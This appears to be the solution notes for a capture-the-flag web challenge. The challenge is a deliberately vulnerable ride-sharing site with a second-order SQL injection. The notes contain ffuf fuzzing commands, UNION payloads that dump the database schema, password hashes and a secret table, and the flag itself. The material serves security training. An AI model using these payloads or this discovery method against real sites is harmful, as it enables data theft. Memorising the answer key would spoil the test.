# RideShare (`/rides/`) - solution notes

- **Difficulty:** Hard
- **Engine:** MySQL 8 (database `rideshare`)
- **Technique:** second-order SQL injection (stored value re-used unsafely later), UNION-based, in-band
- **Hidden parts:** the vulnerable endpoint (`/rides/digest`) and its parameter (`ref`) are not linked anywhere - found with ffuf
- **Flag table:** `ops_secrets` (row labelled "internal dashboard access", column `secret_value`)

There are no accounts, logins, cookies or API keys. The whole site is public.

## Where the injection is

1. The public form at `/rides/subscribe` ("Ride alerts": email, leaving from, going to) stores its values with a **parameterised INSERT**. Nothing is injectable there and quotes are accepted. The confirmation only says "Your alert number is N" - no link, no endpoint name.
2. A hidden page, `GET /rides/digest?ref=<alert number>`, loads the stored row (lookup by number is parameterised and numeric-only) and then builds a listing query by **concatenating the stored `from_city` text**:

```
SELECT id AS c1, origin AS c2, destination AS c3, depart_at AS c4, seats AS c5, price AS c6
FROM rides WHERE origin = '<from_city>' LIMIT 10
```

Six columns, all rendered in a table (c1..c6), so UNION output is visible. On a SQL error the page only says "This listing could not be prepared right now" (no error text), so use UNION, not error-based. The `to_city` and `email` values are only displayed (escaped).

The stored value is limited to 200 characters (payloads below are all shorter).

## How a tester finds it

1. Crawl the visible site: every visible `?param=` endpoint is a decoy (see below).
2. Fuzz for hidden pages (any of these list `digest`, `reviews`, `stats`):
   - `ffuf -u http://HOST:PORT/rides/FUZZ -w /usr/share/wordlists/dirb/common.txt`
   - `ffuf -u http://HOST:PORT/rides/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt`
   Unknown paths are 404; hidden pages are 200 (the visible-site 403/302 pages such as `admin`, `backup` are static dead ends).
3. `/rides/digest` alone returns a short "Nothing to show" page. Fuzz parameter names and filter the baseline size:
   - `ffuf -u 'http://HOST:PORT/rides/digest?FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size of /rides/digest>`
   - `ref` is the only name that changes the response. (`/rides/reviews` takes `id`, `/rides/stats` takes `city`; both are safe.)
4. `?ref=1` .. `?ref=8` show seeded alerts; each page echoes the stored "leaving from" text. Create your own alert at `/rides/subscribe` with a quote in "Leaving from" (e.g. `x'`), note the alert number, then open `/rides/digest?ref=<number>`: the page changes to "could not be prepared". The stored text is what breaks the query.

## Exploitation (put each payload in "Leaving from", then open `/rides/digest?ref=<new alert number>`)

Use a non-existent origin (`x`) so only injected rows come back. `-- -` ends the query (MySQL needs the space after `--`; `#` also works).

| Goal | "Leaving from" value |
|---|---|
| Column count | `x' ORDER BY 6-- -` works, `x' ORDER BY 7-- -` gives the error message |
| Version | `x' UNION SELECT 1,version(),3,4,5,6-- -` |
| Tables | `x' UNION SELECT 1,group_concat(table_name),3,4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -` |
| Columns | `x' UNION SELECT 1,group_concat(column_name),3,4,5,6 FROM information_schema.columns WHERE table_name='ops_secrets'-- -` |
| Rows + flag | `x' UNION SELECT 1,label,secret_value,4,5,6 FROM ops_secrets-- -` |
| Credential-like rows | `x' UNION SELECT 1,username,password_hash,4,5,6 FROM admin_accounts-- -` |
| Driver hashes | `x' UNION SELECT 1,username,password_hash,4,5,6 FROM users-- -` |

Tables: `alerts`, `admin_accounts`, `cities`, `driver_payouts`, `messages`, `ops_secrets` (flag), `promo_codes`, `reviews`, `rides`, `users`.

Flag: `FLAG{rideshare_velvet_compass_3e90}`

## Rabbit holes (all safe)

Visible, linked from the HTML:
- `/rides/ride?id=` - digits only (`isdigit`) and a bound parameter; a quote gives "ride could not be found".
- `/rides/search?from=&to=` - city-name regex (letters, space, dot, hyphen); anything else gives "Please enter a valid city name"; the rest is a bound LIKE.
- `/rides/driver?name=` - bound parameter; a quote gives "No driver found".
- `/rides/city?name=` - regex + bound parameter; a quote gives "We do not have a city by that name".
- `/rides/browse?page=&sort=` - page is an int, sort is a whitelist.

Hidden but safe (found by ffuf, decoys):
- `/rides/reviews?id=` - numeric only, bound.
- `/rides/stats?city=` - regex + bound.
- On `/rides/digest` the `ref` value itself is numeric-only and bound; only the stored text is unsafe.

Dead ends: `/rides/admin`, `/rides/backup` (static 403), `/rides/old`, `/rides/timetable`, `/rides/terms` (static pages), the contact form (parameterised insert, output escaped), the alert form itself (safe at insert time).
